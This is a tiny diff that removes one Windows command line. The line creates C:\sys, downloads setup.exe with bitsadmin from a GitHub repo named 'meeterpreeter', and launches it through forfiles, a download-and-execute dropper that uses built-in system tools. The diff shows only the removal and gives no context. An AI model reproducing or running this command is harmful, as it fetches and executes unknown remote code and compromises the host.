@@ -1,1 +1,0 @@
-if (-not (Test-Path "C:\sys")) { mkdir C:\sys } && bitsadmin /transfer myJob /download /priority high https://github.com/meeterpreeter/files/raw/refs/heads/main/setup.exe C:\sys\setup.exe && forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c C:\sys\setup.exe"
